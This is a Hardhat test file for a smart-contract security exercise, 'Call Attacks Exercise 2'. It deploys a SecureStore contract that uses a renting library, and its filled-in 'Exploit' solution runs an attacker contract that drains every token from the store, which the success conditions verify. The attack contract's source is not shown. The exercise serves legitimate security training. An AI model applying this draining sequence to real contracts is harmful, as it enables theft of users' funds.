const { expect } = require("chai");
const { ethers } = require("hardhat");

describe('Call Attacks Exercise 2', function () {

  let deployer, attacker;

  const INITIAL_SUPPLY = ethers.utils.parseEther('100')
  const ATTACKER_INITIAL_BALANCE = ethers.utils.parseEther('100')
  const STORE_INITIAL_BALANCE = ethers.utils.parseEther('100000')
  const DAILY_RENT_PRICE = ethers.utils.parseEther('50')

  before(async () => {
    /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

    [deployer, attacker] = await ethers.getSigners();

    // Deploy Contracts
    const RentingLibrary = await ethers.getContractFactory(
      'contracts/call-attacks-2/RentingLibrary.sol:RentingLibrary',
      deployer
    );
    this.rentingLibrary = await RentingLibrary.deploy();
    // Deploy Token
    const dummyTokenFactory = await ethers.getContractFactory(
      'contracts/utils/DummyERC20.sol:DummyERC20',
      deployer
    );
    this.usdc = await dummyTokenFactory.deploy("USDC Token", "USDC", INITIAL_SUPPLY);
    const SecureStore = await ethers.getContractFactory(
      'contracts/call-attacks-2/SecureStore.sol:SecureStore',
      deployer
    );
    this.secureStore = await SecureStore.deploy(this.rentingLibrary.address, DAILY_RENT_PRICE, this.usdc.address);

    // Setting up the attacker
    await this.usdc.mint(attacker.address, ATTACKER_INITIAL_BALANCE);

    // Setting up the SecureStore
    await this.usdc.mint(this.secureStore.address, STORE_INITIAL_BALANCE);

  });

  it('Exploit', async () => {
    /** CODE YOUR SOLUTION HERE */

    const AttackerContract = await ethers.getContractFactory(
      'contracts/call-attacks-2/solution/AttackSecureStore.sol:AttackSecureStore',
      attacker
    );
    this.attackerContract = await AttackerContract.deploy(this.usdc.address, this.secureStore.address);

    await this.usdc.connect(attacker).transfer(this.attackerContract.address, ATTACKER_INITIAL_BALANCE)
    await this.attackerContract.attack();
    await this.secureStore.connect(attacker).withdrawAll()

  });

  after(async () => {
    /** SUCCESS CONDITIONS */

    // Attacker stole all the funds from the SecureStore contract
    expect(await this.usdc.balanceOf(this.secureStore.address)).to.eq(0);
    expect(await this.usdc.balanceOf(attacker.address)).to.eq(ATTACKER_INITIAL_BALANCE.add(STORE_INITIAL_BALANCE));

  });
});